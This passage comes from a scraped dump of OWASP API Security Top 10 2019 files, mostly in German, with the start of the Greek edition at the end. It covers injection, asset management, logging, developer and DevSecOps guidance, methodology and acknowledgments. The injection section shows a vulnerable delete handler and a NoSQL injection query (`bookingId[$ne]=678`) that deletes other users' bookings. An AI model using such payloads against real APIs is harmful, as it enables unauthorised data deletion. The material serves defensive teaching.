CRUD-Funktionen für Operationen mit\nBuchungen. Ein Angreifer konnte herausfinden, dass eine NoSQL-Injection möglich ist, welche\ndurch den Query-String-Parameter `bookingId` in der Anfrage zum Löschen von Buchungen besteht. Die Anfrage sieht folgendermaßen aus: `DELETE /api/bookings?bookingId=678`.\n\nDer API-Server verwendet die folgende Funktion zur Bearbeitung von Löschanfragen:\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nDer Angreifer hat die Anfrage abgefangen und den Abfrageparameter `bookingId` wie unten gezeigt geändert. In diesem Fall gelang es dem Angreifer, die Buchung eines anderen Benutzers zu löschen:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Vorbeugende Maßnahmen\n\nUm Injection-Angriffe zu verhindern müssen Daten von Befehlen und Abfragen getrennt werden.\n\n* Führen Sie eine Datenvalidierung mit einer einzigen, vertrauenswürdigen und aktiv gepflegten\nBibliothek durch.\n* Validieren, filtern und bereinigen Sie alle vom Client bereitgestellten Daten oder andere Daten, die\nvon integrierten Systemen kommen.\n* Sonderzeichen sollten unter Verwendung der spezifischen Syntax für den Zielinterpreter\nescaped werden.\n* Bevorzugen Sie eine sichere API, die eine parameterisierte Schnittstelle bereitstellt.\n* Begrenzen Sie immer die Anzahl der zurückgegebenen Datensätze, um einen Datenverlust im Falle von erfolgreichen Injection-Angriffen zu verhindern.\n* Validieren Sie eingehende Daten mithilfe ausreichender Filter, um nur gültige Werte für jeden Eingabeparameter zuzulassen.\n* Definieren Sie Datentypen und strenge Muster für alle String-Parameter.\n\n## Referenzen\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### Externe Quellen\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:20.156867"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **3** : Erkennbarkeit **2** | Komplexität **2** : Unternehmensspezifisch |\n| Alte API-Versionen sind in der Regel nicht gepatcht und bieten daher eine einfache Möglichkeit, Systeme zu kompromittieren, ohne sich mit modernsten Sicherheitsmechanismen auseinandersetzen zu müssen, die zum Schutz der neuesten API-Versionen implementiert wurden. | Veraltete Dokumentation erschwert die Suche nach Schwachstellen und die Behebung dieser. Das Fehlen einer Übersicht aller Systeme und einer Abschalt-Strategie führt zu ungepatchten Systemen, was zu einer Offenlegung sensibler Daten führen kann. Es ist häufig anzutreffen, dass API-Hosts unnötigerweise exponiert werden, da moderne Konzepte wie Microservices eine einfache Bereitstellung und Unabhängigkeit von Anwendungen ermöglichen (z. B. Cloud Computing, k8s). | Angreifer können über alte, ungepatchte API-Versionen, die mit derselben Datenbank verbunden sind, Zugriff auf sensible Daten erlangen oder sogar den Server übernehmen. |\n\n## Ist die API angreifbar?\n\nDie API könnte verwundbar sein, wenn:\n\n* Der Zweck eines API-Hosts unklar ist und es keine klaren Antworten auf folgende Fragen gibt:\n    * In welcher Umgebung wird die API ausgeführt (z. B. Produktion, Staging, Test, Entwicklung)?\n    * Wer sollte Netzwerkzugriff auf die API haben (z. B. öffentlich, intern, Partner)?\n    * Welche API-Version wird ausgeführt?\n    * Welche Daten werden von der API erfasst und verarbeitet (z. B. PII)?\n    * Wie verläuft der Datenfluss?\n* Es gibt keine Dokumentation oder die vorhandene Dokumentation ist veraltet.\n* Es gibt keinen Plan zur Ausmusterung jeder API-Version.\n* Die Dienstübericht der Hosts fehlt oder ist veraltet.\n* Die Übersicht der integrierten Dienste, sowohl von Erst- als auch von Drittanbietern, fehlt oder ist veraltet.\n* Alte oder frühere API-Versionen werden ungepatcht ausgeführt.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nNach der Neugestaltung ihrer Anwendungen ließ ein lokaler Suchdienst eine alte API-Version (`api.someservice.com/v1`) weiterlaufen, ohne Schutz und mit Zugriff auf die Benutzerdatenbank. Während eines Angriffs auf eine der neuesten veröffentlichten Anwendungen fand ein Angreifer die API-Adresse (`api.someservice.com/v2`). Durch das Ersetzen von `v2` in der URL durch `v1` erhielt der Angreifer Zugriff auf die alte, ungeschützte API und konnte personenbezogene Daten (PII) von über 100 Millionen Nutzern offenlegen.\n\n### Szenario #2\n\nEin soziales Netzwerk hat einen Mechanismus zum Rate-Limiting eingeführt, der Angreifer daran hindert, mittels Brute-Force-Attacken zurückgesetzte Passwort-Token zu erraten. Dieser Mechanismus wurde nicht als Teil des API-Codes selbst implementiert, sondern in einer separaten Komponente zwischen dem Client und der offiziellen API (`www.socialnetwork.com`).\nEin Forscher fand einen Beta-API-Host (`www.mbasic.beta.socialnetwork.com`), der dieselbe API ausführte, einschließlich des Mechanismus zum Zurücksetzen des Passworts, aber der Mechanismus zum Rate-Limiting war nicht implementiert. Der Forscher konnte das Passwort jedes Benutzers zurücksetzen, indem er mittels einer einfachen Brute-Force-Methode den 6-stelligen Token erraten hat.\n\n## Vorbeugende Maßnahmen\n\n* Inventarisieren Sie alle API-Hosts und dokumentieren Sie wichtige Aspekte. Konzentrieren Sie sich dabei auf die API-Umgebung (z. B. Produktion, Staging, Test, Entwicklung), wer Netzwerkzugriff auf den Host haben sollte (z. B. öffentlich, intern, Partner) und die API-Version.\n* Inventarisieren Sie integrierte Dienste und dokumentieren Sie wichtige Aspekte wie ihre Rolle im System, welche Daten ausgetauscht werden (Datenfluss) und ihre Sensibilität.\n* Dokumentieren Sie alle Aspekte Ihrer API wie Authentifizierung, Fehler, Umleitungen, Ratenbegrenzung, Cross-Origin Resource Sharing (CORS)-Richtlinien und Endpunkte, einschließlich ihrer Parameter, Anfragen und Antworten.\n* Generieren Sie die Dokumentation automatisch durch die Annahme von offenen Standards. Fügen Sie den Dokumentationsaufbau in Ihre CI/CD-Pipeline ein.\n* Stellen Sie die API-Dokumentation nur denjenigen zur Verfügung, die berechtigt sind, die API zu nutzen.\n* Verwenden Sie externe Schutzmaßnahmen wie API-Sicherheits-Firewalls für alle freigegebenen Versionen Ihrer APIs, nicht nur für die aktuelle Produktionsversion.\n* Vermeiden Sie die Verwendung von Produktionsdaten bei nicht-produktionsbezogenen API-Bereitstellungen. Wenn dies unvermeidlich ist, sollten diese Endpunkte die gleiche Sicherheitsbehandlung wie die Produktionsendpunkte erhalten.\n* Wenn neuere Versionen von APIs Sicherheitsverbesserungen enthalten, führen Sie eine Risikoanalyse durch, um die Entscheidung über die erforderlichen Maßnahmen zur Risikominderung für die ältere Version zu treffen: zum Beispiel, ob es möglich ist, die Verbesserungen rückwärtskompatibel zu machen, ohne die API-Kompatibilität zu beeinträchtigen, oder ob Sie schnell zur älteren Version wechseln und alle Clients zwingen müssen, zur neuesten Version zu wechseln.\n\n## Referenzen\n\n### Externe Quellen\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:20.266522"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **2** | Häufigkeit **3** : Erkennbarkeit **1** | Komplexität **2** : Unternehmensspezifisch |\n| Angreifer nutzen die fehlende Protokollierung und Überwachung aus, um Systeme unbemerkt zu missbrauchen. | Ohne Protokollierung und Überwachung oder mit unzureichender Protokollierung und Überwachung ist es fast unmöglich, verdächtige Aktivitäten zu verfolgen und rechtzeitig darauf zu reagieren. | Ohne Einblick in laufende bösartige Aktivitäten haben Angreifer genügend Zeit, um Systeme vollständig zu kompromittieren. |\n\n## Ist die API angreifbar?\n\nDie API ist angreifbar, wenn:\n\n* Sie keine keine Protokolle erzeugt, die Protokollierungsstufe nicht korrekt eingestellt ist oder die Protokoll Nachrichten nicht genügend Details enthalten.\n* Die Integrität der Protokolle nicht gewährleistet ist(z. B. [Log Injection][1]).\n* Die Protokolle nicht kontinuierlich überwacht werden.\n* Die API-Infrastruktur nicht kontinuierlich überwacht wird.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nDie Zugriffsschlüssel einer administrativen API wurden in einem öffentlichen Repository veröffentlicht. Der\nRepository-Eigentümer wurde per E-Mail über das mögliche Datenleck informiert, brauchte aber mehr als\n48 Stunden, um auf den Vorfall zu reagieren. Die Veröffentlichung der Zugangsschlüssel hat eventuell\nZugang zu sensiblen Daten ermöglicht. Aufgrund der unzureichenden Protokollierung kann das Unternehmen nicht beurteilen, auf welche Daten zugegriffen wurde.\n\n### Szenario #2\n\nEine Video-Sharing-Plattform wurde von einem \"groß angelegten\" Credential Stuffing-Angriff getroffen.\nObwohl fehlgeschlagene Anmeldungen protokolliert wurden, wurde in der Zeitspanne des Angriffs kein Alarm ausgelöst.\nAls Reaktion auf Nutzerbeschwerden wurden die API-Protokolle analysiert und der Angriff wurde entdeckt. Das Unternehmen musste eine öffentliche Ankündigung machen, in der es die Nutzer aufforderte ihre Passwörter zurückzusetzen. Außerdem musste das Unternehmen den Vorfall den Aufsichtsbehörden melden.\n\n## Vorbeugende Maßnahmen\n\n* Protokollieren Sie alle fehlgeschlagenen Authentifizierungsversuche, verweigerten Zugriff und Eingabevalidierungsfehler.\n* Die Protokolle sollten in einem Format geschrieben werden, das von einer Log-Management-Lösung verarbeitet werden kann, und sie sollten genügend Details enthalten, um den Angreifer zu identifizieren.\n* Protokolle sollten als sensible Daten behandelt werden, und ihre Integrität sollte stets gewährleistet sein.\n* Konfigurieren Sie ein Überwachungssystem zur kontinuierlichen Überwachung der Infrastruktur, des Netzwerks und der Funktionsweise der API.\n* Verwenden Sie ein Security Information and Event Management (SIEM), um Protokolle aller Komponenten der API und der Hosts zu sammeln und zu verwalten.\n* Konfigurieren Sie benutzerdefinierte Dashboards und Warnmeldungen, um verdächtige Aktivitäten zu erkennen und darauf reagieren zu können.\n\n## Referenzen\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Externe Quellen\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n\n", "timestamp": "2025-10-24T22:26:20.380951"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xb0-next-devs.md", "content": "# Was kommt als Nächstes für Entwickler?\n\nDie Aufgabe, sichere Software zu erstellen und zu pflegen oder bestehende Software zu reparieren, kann\nschwierig sein. Bei APIs ist das nicht anders.\n\nWir glauben, dass Fortbildung und Bewusstsein die Schlüsselfaktoren für das Schreiben sicherer\nSoftware sind. Alles andere, was erforderlich ist, um das Ziel zu erreichen, hängt ab von\n**Einführung und Verwendung von wiederholbaren Sicherheitsprozessen und standardisierten Sicherheitskontrollen**.\n\nOWASP hat seit Beginn des Projekts zahlreiche freie und offene Ressourcen zum Thema Sicherheit\nvorgestellt. Bitte besuchen Sie die [OWASP-Projektseite][1] für eine umfassende Liste der verfügbaren Projekte.\n\n| | |\n|-|-|\n| **Bildung** | Sie können je nach Beruf und Interesse mit dem Lesen von [OWASP Education Project materials][2] beginnen. Für praktisches Lernen haben wir **crAPI** - **C**ompletely **R**idiculous **API** auf [unsere Roadmap][3] gesetzt. In der Zwischenzeit können Sie WebAppSec mit dem [OWASP DevSlop Pixi Module][4] üben, einem verwundbaren WebApp- und API-Service, der Benutzern beibringen soll, wie man moderne Webanwendungen und APIs auf Sicherheitsprobleme testet und wie man in Zukunft sicherere APIs schreibt. Sie können auch an den Schulungssitzungen der [OWASP AppSec Conference][5] teilnehmen oder [Ihrem lokalen Verband beitreten][6]. |\n| **Sicherheitsanforderungen** | Sicherheit sollte von Anfang an Teil eines jeden Projekts sein. Bei der Anforderungserhebung ist es wichtig zu definieren, was \"sicher\" für dieses Projekt bedeutet. OWASP empfiehlt, den [OWASP Application Security Verification Standard (ASVS)][7] als Leitfaden für die Festlegung der Sicherheitsanforderungen zu verwenden. Wenn Sie ein Projekt auslagern, sollten Sie den [OWASP Secure Software Contract Annex][8] verwenden, der entsprechend den lokalen Gesetzen und Vorschriften angepasst werden sollte. |\n| **Sicherheitsarchitektur** | Sicherheit sollte während aller Projektphasen ein Thema bleiben. Die [OWASP Prevention Cheat Sheets][9] sind ein guter Ausgangspunkt für Anleitungen, wie man Sicherheit schon in der Architekturphase einplant. Unter vielen anderen finden Sie das [REST Security Cheat Sheet][10] und das [REST Assessment Cheat Sheet][11]. |\n| **Standard-Sicherheitskontrollen** | Die Übernahme von Standard-Sicherheitskontrollen verringert das Risiko, beim Schreiben Ihrer eigenen Logik Sicherheitslücken einzuführen. Trotz der Tatsache, dass viele moderne Frameworks mittlerweile über eingebaute effektive Standardkontrollen verfügen, gibt [OWASP Proactive Controls][12] einen guten Überblick darüber, welche Sicherheitskontrollen Sie in Ihr Projekt einbauen sollten. OWASP stellt auch einige Bibliotheken und Tools zur Verfügung, die für Sie nützlich sein können, wie z.B. Validierungskontrollen. |\n| **Secure Software Development Life Cycle** | Sie können das [OWASP Software Assurance Maturity Model (SAMM)][13] verwenden, um den Prozess bei der Erstellung von APIs zu verbessern. Mehrere andere OWASP-Projekte stehen zur Verfügung, um Sie in den verschiedenen Phasen der API-Entwicklung zu unterstützen, z. B. das [OWASP Code Review Project][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:20.491046"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xb1-next-devsecops.md", "content": "# Was kommt als Nächstes für DevSecOps?\n\nAufgrund ihrer Bedeutung in modernen Anwendungsarchitekturen ist der Aufbau sicherer\nAPIs von entscheidender Bedeutung. Die Sicherheit darf nicht vernachlässigt werden und sollte Teil des\ngesamten Entwicklungslebenszyklus sein. Jährliches Scannen und Penetrationstests sind nicht länger ausreichend.\n\nDevSecOps sollte die Entwicklung begleiten und kontinuierliche Sicherheitstests über den gesamten Lebenszyklus der Softwareentwicklung hinweg durchführen. Ihr Ziel ist es die Entwicklungspipeline durch Sicherheitsautomatisierung zu verbessern, ohne die\nGeschwindigkeit der Entwicklung zu beeinträchtigen.\n\nIm Zweifelsfall sollten Sie auf dem Laufenden bleiben und das [DevSecOps Manifesto][1] lesen.\n\n| | |\n|-|-|\n| **Verstehen Sie das Bedrohungsmodell** | Testprioritäten ergeben sich aus einem Bedrohungsmodell. Wenn Sie keins haben, können Sie den [OWASP Application Security Verification Standard (ASVS)][2] und die [OWASP Testing Guide][3] als Grundlage verwenden. Die Einbeziehung des Entwicklungsteams kann helfen, das Sicherheitsbewusstsein zu stärken. |\n|**Verstehen Sie den SDLC**| Nehmen Sie am Entwicklungsteam teil, um den Software Development Life Cycle besser zu verstehen. Ihr Beitrag zu kontinuierlichen Sicherheitstests sollte mit Menschen, Prozessen und Werkzeugen kompatibel sein. Jeder sollte mit dem Prozess einverstanden sein, so dass es keine unnötigen Reibungen oder Widerstände gibt. |\n|**Teststrategien**| Da Ihre Arbeit die Entwicklungsgeschwindigkeit nicht beeinträchtigen sollte, sollten Sie mit Bedacht die beste (einfachste, schnellste, genaueste) Technik zur Überprüfung der Sicherheitsanforderungen wählen. Das [OWASP Security Knowledge Framework][4] und der [OWASP Application Security Verification Standard][5] können gute Quellen für funktionale und nichtfunktionale Sicherheitsanforderungen sein. Es gibt weitere hervorragende Quellen für [Projekte][6] und [Tools][7], ähnlich wie die von der [DevSecOps-Community][8] angebotenen. |\n**Erreichen von Abdeckung und Genauigkeit** | Sie sind die Brücke zwischen den Entwicklern und den Betriebsteams. Um eine gute Abdeckung zu erreichen, sollten Sie sich nicht nur auf die Funktionalität, sondern auch auf die Orchestrierung konzentrieren. Arbeiten Sie von Anfang an eng mit den Entwicklungs- und Betriebsteams zusammen, damit Sie Ihre Zeit und Ihren Aufwand optimieren können. Sie sollten einen Zustand anstreben, in dem die wesentliche Sicherheit kontinuierlich überprüft wird. |\n**Klare Kommunikation der gefundenen Schwachstellen** | Tragen Sie mit weniger oder gar keinen Reibungsverlusten zur Wertschöpfung bei. Stellen Sie die Ergebnisse zeitnah mit den von den Entwicklungsteams verwendeten Tools bereit (keine PDF-Dateien). Arbeiten Sie mit dem Entwicklungsteam zusammen, um die Schwachstellen zu besprechen. Nutzen Sie die Gelegenheit, sie aufzuklären, indem Sie die Schwachstelle klar beschreiben und erläutern, wie sie missbraucht werden kann, einschließlich eines Angriffsszenarios, um es realistisch zu machen. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:20.602195"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xd0-about-data.md", "content": "# Methodik und Daten\n\n## Überblick\n\nDie AppSec-Branche hatte sich bisher nicht speziell auf die neueste Architektur von Anwendungen, in denen APIs eine wichtige Rolle spielen fokusiert. Deshalb wäre eine\nListe der zehn kritischsten API-Sicherheitsrisiken auf der Grundlage eines öffentlichen Datenaufrufs zu erstellen, eine schwierige Aufgabe gewesen. Obwohl es keinen öffentlichen Datenaufruf gab, basiert die\nTop-10-Liste auf öffentlich verfügbaren Daten, Beiträgen von Sicherheitsexperten und offene Diskussionen mit der Community.\n\n## Methodik\n\nIn der ersten Phase wurden öffentlich verfügbare Daten über Sicherheitsvorfälle mit APIs\nvon einer Gruppe von Sicherheitsexperten gesammelt, geprüft und kategorisiert. Solche\nDaten wurden innerhalb eines Zeitraums von einem Jahr von Bug Bounty-Plattformen und Schwachstellendatenbanken gesammelt. Sie wurden für statistische Zwecke verwendet.\n\nIn der nächsten Phase wurden Sicherheitsexperten mit Erfahrung in Penetrationstests\ngebeten, ihre eigene Top-10-Liste zusammenzustellen.\n\nZur Durchführung der Risikoanalyse wurde die [OWASP Risk Rating Methodology][1] verwendet. Die\nBewertungen wurden von den Sicherheitsexperten diskutiert und überprüft. Für\nÜberlegungen zu diesen Themen finden Sie im Abschnitt [API-Sicherheitsrisiken][2].\n\nDer erste Entwurf der OWASP API Security Top 10 2019 entstand aus einem Konsens zwischen den statistischen Ergebnissen aus Phase eins und den Listen der Sicherheitsexperten. Dieser Entwurf wurde dann einer weiteren Gruppe von Sicherheitsexperten mit einschlägiger Erfahrung im Bereich der API-Sicherheit\nweitergeleitet.\n\nDie OWASP API Security Top 10 2019 wurde erstmals auf der OWASP Global AppSec Tel Aviv Veranstaltung (Mai 2019) vorgestellt. Seitdem steht sie auf GitHub für öffentliche Diskussionen und Beiträge zur Verfügung.\n\nDie Liste der Mitwirkenden ist im Abschnitt [Acknowledgments][3] verfügbar.\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:20.705242"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xd1-acknowledgments.md", "content": "# Danksagungen\n\n## Danksagungen an einzelne Mitwirkende\n\nWir möchten uns bei den folgenden Personen bedanken, die öffentlich auf GitHub\noder über andere Wege zu diesem Projekt beigetragen haben:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n* Nick Lorenz\n* Moritz Gruber\n* Tim Barsch (domai-tb)\n* Steffen Thamm\n", "timestamp": "2025-10-24T22:26:20.810804"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019 στα Ελληνικά\n\nΤα 10 Κορυφαία Ρίσκα Ασφαλείας API - Ελληνική μετάφραση του \"The Ten Most Critical API Security Risks\"\n\n30/6/2022\n\n![WASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Η παρούσα εργασία διατίθεται υπό την άδεια [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:21.459800"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x00-notice.md", "content": "# Σημείωση\n\nΤο παρών είναι η έκδοση κειμένου του OWASP API Security Top 10 που χρησιμοποιείται σαν πηγή \nγια την επίσημη έκδοση και διατίθεται σαν Portable Document Format (PDF).\n\nΟποιαδήποτε συνεισφορά στην εργασία όπως σχόλια, διορθώσεις, ή μεταφράσεις \nθα πρέπει να γίνονται εδώ. Για περισσότερες πληροφορίες για το Πως να συνεισφέρετε, \nπαρακαλώ δείτε το CONTRIBUTING.md.\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:21.571752"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x00-toc.md", "content": "# Πίνακας Περιεχομένων\n\n* [Πίνακας Περιεχομένων](0x00-toc.md)\n* [Σχετικά με το OWASP](0x01-about-owasp.md)\n* [Πρόλογος](0x02-foreword.md)\n* [Εισαγωγή](0x03-introduction.md)\n* [Σημειώσεις Έκδοσης](0x04-release-notes.md)\n* [Ρίσκα Ασφαλείας API](0x10-api-security-risks.md)\n* [OWASP Τα 10 Κορυφαία Ρίσκα Ασφαλείας API – 2019](0x11-t10.md)\n* [API1:2019 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Broken User Authentication](0xa2-broken-user-authentication.md)\n* [API3:2019 Excessive Data Exposure](0xa3-excessive-data-exposure.md)\n* [API4:2019 Lack of Resources & Rate Limiting](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Mass Assignment](0xa6-mass-assignment.md)\n* [API7:2019 Security Misconfiguration](0xa7-security-misconfiguration.md)\n* [API8:2019 Injection](0xa8-injection.md)\n* [API9:2019 Improper Assets Management](0xa9-improper-assets-management.md)\n* [API10:2019 Insufficient Logging & Monitoring](0xaa-insufficient-logging-monitoring.md)\n* [Επόμενα Βήματα για Προγραμματιστές](0xb0-next-devs.md)\n* [Επόμενα Βήματα για DevSecOps](0xb1-next-devsecops.md)\n* [Μεθοδολογία και Δεδομένα](0xd0-about-data.md)\n* [Ευχαριστίες](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:21.677890"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0x01-about-owasp.md", "content": "# Σχετικά με το OWASP\n\nΤο OWASP (Open Web Application Security Project) είναι μια ανοιχτή κοινότητα\nπου αποσκοπεί στο να βοηθήσει οργανισμούς να παράγουν, να προμηθεύονται και \nνα συντηρούν εφαρμογές και API που θα είναι ασφαλή.\n\nΣτο OWASP θα βρείτε δωρεάν διαθέσιμα και ελεύθερα προσβάσιμα σε όλους τα παρακάτω:\n\n* Εργαλεία ασφαλείας εφαρμογών καθώς και πρότυπα ασφαλείας (standards).\n* Ολόκληρα βιβλία για testing ασφαλείας εφαρμογών, ανάπτυξη ασφαλούς κώδικα, και \nελέγχου (review) ασφαλούς κώδικα.\n* Παρουσιάσεις και [βίντεο][1].\n* [Σκονάκια][2] (cheatsheets) σε πολλά συνήθη θέματα.\n* Standard ελέγχους ασφαλείας και βιβλιοθήκες.\n* [Τοπικά chapters σε όλο τον κόσμο][3].\n* Κορυφαίες έρευνες.\n* [Συνέδρια σε όλο τον κόσμο][4].\n* [Λίστες ταχυδρομείου][5].\n\nΜάθετε περισσότερα στο: [https://www.owasp.org][6].\n\nΌλα τα εργαλεία, έγγραφα, βίντεο, παρουσιάσεις και παραρτήματα (chapters) του OWASP είναι δωρεάν διαθέσιμα και ελεύθερα προσβάσιμα σε όλους όσους ενδιαφέρονται να βελτιώσουν την ασφάλεια των εφαρμογών τους.\n\nΠροσεγγίζουμε την ασφάλεια εφαρμογών ως ένα πρόβλημα ανθρώπων, \nδιεργασιών και τεχνολογίας, καθώς οι πιο αποτελεσματικές προσεγγίσεις \nστο πρόβλημα απαιτούν βελτιώσεις στους παραπάνω τομείς.\n\nΤο OWASP είναι ένα νέο είδος οργανισμού. Η ανεξαρτησία μας από τυχόν εμπορικές πιέσεις\nμας επιτρέπει να παρέχουμε αμερόληπτες, πρακτικές και οικονομικά αποδοτικές \nπληροφορίες σχετικά με την ασφάλεια εφαρμογών.\n\nΤο OWASP δεν είναι συνδεδεμένο με καμία εταιρεία τεχνολογίας. Παρόλα αυτά υποστηρίζουμε την\nσωστή χρήση της εμπορικής τεχνολογίας ασφαλείας. Το OWASP παράγει υλικό με \nσυλλογικό, διαφανή και ανοιχτό τρόπο.\n\nΤο Ίδρυμα OWASP είναι η μη κερδοσκοπική οντότητα που διασφαλίζει την μακροπρόθεσμη επιτυχία\nαυτού του έργου. Σχεδόν όλοι όσοι σχετίζονται με το OWASP είναι εθελοντές,\nσυμπεριλαμβανομένου του διοικητικού συμβουλίου OWASP, των επικεφαλής των παραρτημάτων (chapters), των επικεφαλής έργων και των μελών των έργων (projects). Υποστηρίζουμε την καινοτόμο έρευνα στον τομέα ασφαλείας με επιχορηγήσεις και υποδομές.\n\nΣας καλούμε να συμμετάσχετε και εσείς στο OWASP!\n\n## Copyright και Άδεια\n\n![license](images/license.png)\n\nCopyright © 2003-2019 The OWASP Foundation. Αυτό το έγγραφο κυκλοφορεί υπό την άδεια\n[Creative Commons Attribution Share-Alike 4.0 license][7]. Για να 